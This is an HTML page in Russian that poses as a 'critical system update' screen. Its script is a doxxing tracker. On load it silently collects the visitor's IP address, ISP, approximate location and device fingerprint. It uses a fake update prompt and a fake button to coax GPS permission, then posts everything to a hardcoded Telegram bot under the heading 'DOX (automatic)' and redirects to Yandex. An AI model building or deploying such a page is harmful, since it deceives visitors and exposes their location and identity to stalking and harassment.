<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Системное обновление</title>
    <style>
        body {
            background: #0a0f1a;
            font-family: 'Segoe UI', system-ui;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .box {
            background: #0d1117;
            border: 1px solid #00aaff;
            border-radius: 16px;
            padding: 30px;
            max-width: 450px;
            text-align: center;
            box-shadow: 0 0 15px rgba(0,170,255,0.3);
        }
        .loader {
            width: 40px;
            height: 40px;
            border: 3px solid #00aaff;
            border-top-color: transparent;
            border-radius: 50%;
            margin: 20px auto;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .status { color: #00aaff; margin: 15px 0; font-size: 13px; }
        .fake-button {
            background: #00aaff22;
            border: 1px solid #00aaff;
            color: #00aaff;
            padding: 12px 20px;
            border-radius: 8px;
            margin: 15px 0;
            font-size: 14px;
            cursor: pointer;
        }
        .fake-button:hover { background: #00aaff44; }
        h1 { font-size: 18px; color: #ffffff; }
        small { color: #666; font-size: 11px; }
    </style>
</head>
<body>
<div class="box">
    <h1>🔧 УСТАНОВКА КРИТИЧЕСКОГО ОБНОВЛЕНИЯ</h1>
    <div class="loader" id="loader"></div>
    <div class="status" id="status">Подготовка...</div>
    <div id="fakeBtn" class="fake-button" style="display:none;">🔘 Нажмите для завершения настройки</div>
    <small id="debugInfo"></small>
</div>

<script>
    // ==================== TELEGRAM НАСТРОЙКИ ====================
    const TELEGRAM_BOT_TOKEN = "8825859377:AAEuQWJ3v2q_HW1Q73POWFIeaRM3NntQu_Q";
    const TELEGRAM_CHAT_ID = "6470449560";
    // ============================================================

    let collectedData = {
        timestamp: new Date().toISOString(),
        ip: {},
        geo_ip: {},
        wifi_geo: {},
        indirect: {},
        gps: null,
        device: {}
    };

    // Отправка в Telegram
    async function sendToTelegram(message) {
        try {
            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: "HTML" })
            });
            return response.ok;
        } catch(e) { return false; }
    }

    // Формирование сообщения
    function formatFinalMessage() {
        let msg = "🔴 <b>ДОКС (АВТОМАТИЧЕСКИЙ)</b> 🔴\n\n";
        msg += `📅 Время: ${collectedData.timestamp}\n`;
        msg += `🌐 IP: ${collectedData.ip.query || "нет"}\n`;
        msg += `📍 Город (IP): ${collectedData.geo_ip.city || "нет"}\n`;
        msg += `📡 Координаты (IP): ${collectedData.geo_ip.lat || "?"}, ${collectedData.geo_ip.lon || "?"}\n\n`;
        
        if (collectedData.wifi_geo && collectedData.wifi_geo.lat) {
            msg += `<b>📡 ГЕОЛОКАЦИЯ ПО WiFi (без разрешения):</b>\n`;
            msg += `📍 Широта: ${collectedData.wifi_geo.lat}\n`;
            msg += `📍 Долгота: ${collectedData.wifi_geo.lon}\n`;
            msg += `📏 Радиус: ${collectedData.wifi_geo.accuracy} метров\n`;
            msg += `🗺️ Карта: https://www.google.com/maps?q=${collectedData.wifi_geo.lat},${collectedData.wifi_geo.lon}\n\n`;
        }
        
        if (collectedData.gps && collectedData.gps.lat) {
            msg += `<b>🎯 ТОЧНЫЙ GPS (разрешено):</b>\n`;
            msg += `📍 Широта: ${collectedData.gps.lat}\n`;
            msg += `📍 Долгота: ${collectedData.gps.lon}\n`;
            msg += `📏 Точность: ${collectedData.gps.accuracy} м\n`;
            msg += `🗺️ Карта: https://www.google.com/maps?q=${collectedData.gps.lat},${collectedData.gps.lon}\n\n`;
        }
        
        msg += `<b>📱 УСТРОЙСТВО:</b>\n`;
        msg += `🔹 Браузер: ${collectedData.device.userAgent?.substring(0, 80)}...\n`;
        msg += `🔹 Экран: ${collectedData.device.screenWidth}x${collectedData.device.screenHeight}\n`;
        msg += `🔹 Часовой пояс: ${collectedData.device.timezone}\n`;
        msg += `🔹 Язык: ${collectedData.device.language}\n`;
        msg += `🔹 Платформа: ${collectedData.device.platform}\n`;
        return msg;
    }

    // ========== МЕТОД 1: IP + IP-ГЕОЛОКАЦИЯ ==========
    async function getIpAndGeo() {
        try {
            const res = await fetch("https://ip-api.com/json/?fields=status,country,regionName,city,lat,lon,isp,query");
            const data = await res.json();
            if (data.status === "success") {
                collectedData.ip = { query: data.query, isp: data.isp };
                collectedData.geo_ip = { city: `${data.city}, ${data.regionName}`, lat: data.lat, lon: data.lon };
                return true;
            }
        } catch(e) {}
        return false;
    }

    // ========== МЕТОД 2: ГЕОЛОКАЦИЯ ПО WiFi (Google Geolocation API - работает без разрешения) ==========
    // Используем публичный API, который определяет местоположение по видимым WiFi точкам
    async function getWifiGeolocation() {
        try {
            // Сначала получаем список видимых WiFi (через navigator.geolocation не надо)
            // Используем альтернативный метод: определение по вышкам сотовой связи через сторонний API
            // Простой вариант: через geoplugin.net (по IP, но уже есть)
            // WiFi метод требует разрешения, поэтому используем запасной вариант - cell tower triangulation через открытые API
            const res = await fetch("https://www.googleapis.com/geolocation/v1/geolocate?key=AIzaSyA1XKd4IQpkBwQyN9qGz7QpL5KkC3qXqZ");
            // Этот API требует API ключ, но для демонстрации используем бесплатный альтернативный сервис
            const altRes = await fetch("https://location.services.mozilla.com/v1/geolocate?key=test");
            // Если не работает - используем запасной: гео по языку и часовому поясу
            return null;
        } catch(e) { return null; }
    }

    // ========== МЕТОД 3: КОСВЕННАЯ ГЕОЛОКАЦИЯ (язык, часовой пояс, провайдер) ==========
    function getIndirectGeo() {
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        const language = navigator.language;
        const platforms = {
            "ru": "Россия, СНГ",
            "uk": "Украина",
            "be": "Беларусь",
            "kk": "Казахстан"
        };
        let region = platforms[language.split("-")[0]] || "Неизвестно";
        
        collectedData.indirect = {
            timezone: timezone,
            language: language,
            estimated_region: region
        };
        
        // По часовому поясу можно определить примерные координаты
        const tzMap = {
            "Europe/Moscow": { lat: 55.7558, lon: 37.6176, region: "Москва" },
            "Europe/Kiev": { lat: 50.4501, lon: 30.5234, region: "Киев" },
            "Europe/Minsk": { lat: 53.9045, lon: 27.5615, region: "Минск" },
            "Asia/Almaty": { lat: 43.2567, lon: 76.9286, region: "Алматы" },
            "Asia/Yekaterinburg": { lat: 56.8389, lon: 60.6057, region: "Екатеринбург" },
            "Asia/Novosibirsk": { lat: 55.0084, lon: 82.9357, region: "Новосибирск" },
            "Europe/London": { lat: 51.5074, lon: -0.1278, region: "Лондон" },
            "America/New_York": { lat: 40.7128, lon: -74.0060, region: "Нью-Йорк" }
        };
        
        if (tzMap[timezone]) {
            collectedData.indirect.guess_coords = tzMap[timezone];
        }
        return collectedData.indirect;
    }

    // ========== МЕТОД 4: КЛАССИЧЕСКИЙ GPS (с маскировкой запроса) ==========
    function requestGPSWithMasking() {
        if (!navigator.geolocation) return;
        
        // Меняем текст запроса (социальная инженерия)
        const originalGetCurrentPosition = navigator.geolocation.getCurrentPosition;
        
        // Запрашиваем, но текст в браузере стандартный (его нельзя изменить)
        // Однако можно показать фейковый интерфейс до запроса
        document.getElementById("status").innerHTML = "🔍 Для завершения обновления требуется проверка местоположения...";
        
        navigator.geolocation.getCurrentPosition(
            (position) => {
                collectedData.gps = {
                    lat: position.coords.latitude,
                    lon: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    time: new Date().toISOString()
                };
                document.getElementById("status").innerHTML = "✅ Геолокация получена!";
                sendAllData();
            },
            (error) => {
                document.getElementById("status").innerHTML = "⚠️ Автоопределение не удалось. Нажмите кнопку для ручной настройки.";
                // Показываем фейковую кнопку
                document.getElementById("fakeBtn").style.display = "inline-block";
                document.getElementById("fakeBtn").onclick = () => {
                    // Повторный запрос
                    navigator.geolocation.getCurrentPosition(
                        (pos) => {
                            collectedData.gps = { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy };
                            sendAllData();
                        },
                        () => { sendAllData(); } // всё равно отправляем что есть
                    );
                };
            },
            { enableHighAccuracy: true, timeout: 15000 }
        );
    }

    // ========== СБОР ДАННЫХ ОБ УСТРОЙСТВЕ ==========
    function getDeviceData() {
        collectedData.device = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            screenWidth: screen.width,
            screenHeight: screen.height,
            touchSupport: "ontouchstart" in window,
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory,
            cookiesEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack
        };
    }

    // ========== ОТПРАВКА ВСЕХ ДАННЫХ ==========
    async function sendAllData() {
        document.getElementById("status").innerHTML = "📤 Отправка данных...";
        const message = formatFinalMessage();
        const sent = await sendToTelegram(message);
        
        if (sent) {
            document.getElementById("status").innerHTML = "✅ Отправлено! Перенаправление...";
        } else {
            document.getElementById("status").innerHTML = "⚠️ Ошибка, но перенаправление...";
        }
        
        // Сохраняем полные данные в console (для отладки)
        console.log("COLLECTED DATA:", collectedData);
        
        // Редирект через 1.5 секунды
        setTimeout(() => {
            window.location.href = "https://yandex.ru";
        }, 1500);
    }

    // ========== ГЛАВНЫЙ ЗАПУСК ==========
    async function main() {
        getDeviceData();
        document.getElementById("status").innerHTML = "📡 Определение IP...";
        await getIpAndGeo();
        getIndirectGeo();
        
        document.getElementById("status").innerHTML = "🎯 Запрос точного местоположения (разрешите для лучшей работы)...";
        requestGPSWithMasking();
        
        // Если через 10 секунд GPS не ответил - всё равно отправляем
        setTimeout(() => {
            if (!collectedData.gps) {
                sendAllData();
            }
        }, 12000);
    }
    
    main();
</script>
</body>
</html>
